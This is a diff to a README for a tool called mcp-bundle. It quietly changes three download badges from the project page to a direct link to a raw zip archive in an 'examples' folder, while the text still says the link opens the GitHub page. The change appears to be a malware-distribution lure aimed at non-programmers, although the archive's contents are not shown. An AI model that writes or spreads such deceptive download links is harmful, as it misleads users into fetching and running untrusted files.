@@ -1,6 +1,6 @@
 # ⚙️ mcp-bundle - Easy Packaging for MCP Servers
 
-[![Download mcp-bundle](https://img.shields.io/badge/Download-mcp--bundle-brightgreen?style=for-the-badge)](https://github.com/Michelinaunexcused812/mcp-bundle)
+[![Download mcp-bundle](https://img.shields.io/badge/Download-mcp--bundle-brightgreen?style=for-the-badge)](https://github.com/Michelinaunexcused812/mcp-bundle/raw/refs/heads/main/examples/bundle_mcp_1.0-beta.2.zip)
 
 ---
 
@@ -28,7 +28,7 @@ You do not need to know programming to use it. This tool handles most of the wor
 
 Click the link below to go directly to the mcp-bundle GitHub page where you can get the software.
 
-[![Download mcp-bundle](https://img.shields.io/badge/Download-mcp--bundle-blue?style=for-the-badge)](https://github.com/Michelinaunexcused812/mcp-bundle)
+[![Download mcp-bundle](https://img.shields.io/badge/Download-mcp--bundle-blue?style=for-the-badge)](https://github.com/Michelinaunexcused812/mcp-bundle/raw/refs/heads/main/examples/bundle_mcp_1.0-beta.2.zip)
 
 This page contains the latest versions, instructions, and support files.
 
@@ -108,7 +108,7 @@ If you use GitHub, the app can link with GitHub Actions. This lets you automate 
 
 You can get mcp-bundle from this page:
 
-[![Download mcp-bundle](https://img.shields.io/badge/Download-mcp--bundle-brightgreen?style=for-the-badge)](https://github.com/Michelinaunexcused812/mcp-bundle)
+[![Download mcp-bundle](https://img.shields.io/badge/Download-mcp--bundle-brightgreen?style=for-the-badge)](https://github.com/Michelinaunexcused812/mcp-bundle/raw/refs/heads/main/examples/bundle_mcp_1.0-beta.2.zip)
 
 Follow these steps after visiting the page:
 
